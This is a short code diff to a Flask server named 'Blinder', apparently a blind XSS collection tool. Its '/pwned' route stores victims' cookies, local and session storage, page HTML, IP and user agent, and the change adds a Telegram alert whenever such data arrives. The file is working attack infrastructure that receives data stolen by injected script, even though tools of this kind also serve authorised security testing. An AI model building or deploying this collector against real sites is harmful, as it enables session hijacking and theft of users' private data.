@@ -5,6 +5,7 @@ from flask_basicauth import BasicAuth
 from datetime import datetime
 from io import BytesIO
 import sqlite3
+import requests
 import config
 
 
@@ -45,6 +46,13 @@ def get_cursor(commit=False):
 			cur.close()
 
 
+def send_telegram(msg):
+	if config.TELEGRAM_CHAT_ID and config.TELEGRAM_KEY:
+		url = "https://api.telegram.org/bot" + config.TELEGRAM_KEY + "/sendMessage"
+		data = {"text": msg, "chat_id": config.TELEGRAM_CHAT_ID}
+		requests.post(url, data=data)
+
+
 @app.route('/')
 def home():
 	with open('payload.js', 'r') as f:
@@ -61,6 +69,7 @@ def pwned():
 	data["time"] = datetime.now()
 	with get_cursor(commit=True) as cur:
 		cur.execute("INSERT INTO triggers (cookies,url,localStorage,sessionStorage,html,canvas,useragent,IP,time,extra) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (data["cookies"], data["url"], data["localStorage"], data["sessionStorage"], data["html"], data["canvas"], data["useragent"], data["IP"], data["time"], data["extra"]))
+	send_telegram('[x] Blinder: A blind XSS was triggered! ' + config.DOMAIN + '/dashboard')
 	return 'ok'
 
 
